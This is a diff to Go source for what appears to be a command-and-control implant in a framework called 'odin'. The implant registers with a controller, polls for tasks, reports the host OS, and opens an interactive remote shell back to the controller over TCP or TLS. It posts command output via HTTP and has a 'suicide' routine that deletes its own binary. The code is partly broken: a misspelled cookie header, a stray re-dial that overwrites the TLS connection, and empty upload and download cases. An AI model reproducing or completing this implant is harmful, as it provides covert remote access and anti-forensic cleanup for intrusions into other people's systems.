@@ -2,6 +2,7 @@ package agent
 
 import(
   "os"
+  "io"
   "log"
   "fmt"
   "net"
@@ -10,12 +11,13 @@ import(
   "os/exec"
   "net/http"
   "runtime"
-  "encoding/gob"
   "crypto/tls"
+  "io/ioutil"
   "crypto/x509"
-  "odin/lib/core"
+  "odin/lib/c2"
   "odin/lib/utils"
   "odin/lib/penguins/zoo"
+  "odin/wheagle/server/grpcapi"
 )
 
 type ImplantWrapper struct{
@@ -27,14 +29,14 @@ type ImplantWrapper struct{
   RootPem []byte
 }
 
-func (iw *ImplantWrapper) RunAgent(){
+func (iw *ImplantWrapper) RunHTTPImplant(){
   //create a http/https cient
   var (
     err error
     url string
     client *http.Client
     output string
-    work grpcapi.Command
+    work *grpcapi.Command
   )
   client = new(http.Client)
   if iw.Tls {
@@ -51,8 +53,8 @@ func (iw *ImplantWrapper) RunAgent(){
     url = fmt.Sprintf("http://%s",iw.Address)
   }
   //register
-  regUrl := fmt.Sprintf("%s/auth/?msid=%s&mid=%s",regUrl,iw.MothershipID,iw.ISession.SessionID)
-  req,err := http.NewRequest("GET",regUrl)
+  regUrl := fmt.Sprintf("%s/auth/?msid=%s&mid=%s",url,iw.MothershipID,iw.ISession.SessionID)
+  req,err := http.NewRequest("GET",regUrl,nil)
   if err != nil{
     log.Println(err);return
   }
@@ -60,17 +62,18 @@ func (iw *ImplantWrapper) RunAgent(){
   if err != nil{
     fmt.Println("[-]  Error sending request: ",err);return
   }
-  if if resp.StatusCode != http.StatusOK {
+  if resp.StatusCode != http.StatusOK {
 		fmt.Println("Server returned non-OK status code:", resp.Status)
-    fmt.Println(resp.Body.String())
+    fmt.Println(resp.Body)
 		return
 	}
-  cookie := resp.Body.Header.Get("Coockie")
+  cookie := resp.Header.Get("Coockie")
   resp.Body.Close();time.Sleep(5 * time.Second)
   START:
   // get work
   workUrl := url+"/getwork"
-  if req,err = http.NewRequest("GET",workUrl); err != nil {
+  outUrl := url+"/output"
+  if req,err = http.NewRequest("GET",workUrl,nil); err != nil {
     fmt.Println("[-]  Error getting work: ",err);goto START
   }
   resp,err = client.Do(req)
@@ -78,20 +81,25 @@ func (iw *ImplantWrapper) RunAgent(){
     fmt.Println("[-]  Error sending request: ",err);return
   }
   if resp.StatusCode == http.StatusNoContent {
-    sleep(5 * time.Secoond)
+    time.Sleep(5 * time.Second)
     goto START
   }
   if resp.StatusCode != http.StatusOK {
 		fmt.Println("Server returned non-OK status code for POST request:", resp.Status)
+    time.Sleep(5 * time.Second)
 		goto START
 	}
   // switch the work
-  dec := gob.NewDecoder(bytes.NewReader(resp))
-	if err := dec.Decode(&work); err != nil {
-		fmt.Errorf("Failed to decode received data: %s", err)
-	}
+  body,err := ioutil.ReadAll(resp.Body)
+  if err != nil {
+    utils.Logerror(err);return
+  }
   resp.Body.Close()
-  switch work.CmdIn {
+  work,err = grpcapi.WorkDecode(body)
+  if err != nil{
+    time.Sleep(5 * time.Second);goto START
+  }
+  switch work.In {
   case "":
     time.Sleep(5 * time.Second)
     goto START
@@ -100,8 +108,8 @@ func (iw *ImplantWrapper) RunAgent(){
     goto START
   case "getos":
     output = runtime.GOOS
-    work.Work.CmdOut += output
-    iw.SendOutput(cmd)
+    work.Out += output
+    iw.SendOutput(cookie,outUrl,work)
     goto START
   case "upload":
   case "download":
@@ -114,31 +122,64 @@ func (iw *ImplantWrapper) RunAgent(){
         log.Println("Error appending cert to pool")
         return
       }
-      conn,err := tls.Dial("tcp",ic.Address, &tls.Config{
+      conn,err = tls.Dial("tcp",iw.Address, &tls.Config{
         RootCAs: roots,
       })
       if err != nil{
         log.Println(err);goto START
       }
     } else {
-      conn,err = net.Dial(w,wc.Address)
+      conn,err = net.Dial("tcp",iw.Address)
       if err != nil{
         log.Println(err);goto START
       }
     }
-    conn := net.Dial
+    // change thsi to check protocol for tcp/tls
+    conn,_ = net.Dial("tcp",iw.Address)
     Interactive(conn)
   case "suicide":
     output = "Initiating kill chain..........."
-    work.CmdOut += output
-    iw.SendOutput(ctx,cmd)
+    work.Out += output
+    iw.SendOutput(cookie,outUrl,work)
     _ = os.Remove(os.Args[0])
     os.Exit(0)
   default:
     work.Out += output
-    iw.SendOutput(ctx,work)
+    iw.SendOutput(cookie,outUrl,work)
     goto START
   }
+}
+
+// does not return that way if the post request/encoding fais the work still remains in the pool.
+func (iw *ImplantWrapper) SendOutput(cookie, outUrl string, cmd *grpcapi.Command) {
+	data, err := grpcapi.WorkEncode(cmd)
+	if err != nil {
+		return
+	}
+	var count int
+  BEGIN:
+	req, err := http.NewRequest("POST", outUrl, bytes.NewReader(data))
+	if err != nil {
+    utils.Logerror(fmt.Errorf("Failed to create POST request: %s", err))
+		return
+	}
+	// Set the cookie in the request header
+	req.Header.Set("Cookie", cookie)
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+    utils.Logerror(fmt.Errorf("Failed to make POST request: %s", err))
+		return
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		if count >= 3 {
+      utils.Logerror(fmt.Errorf("Error sending output: %s with statuscode %s",resp.Body,resp.StatusCode))
+			return
+		}
+		count++
+		goto BEGIN
+	}
+	return
 }
 
 func Interactive(conn net.Conn){
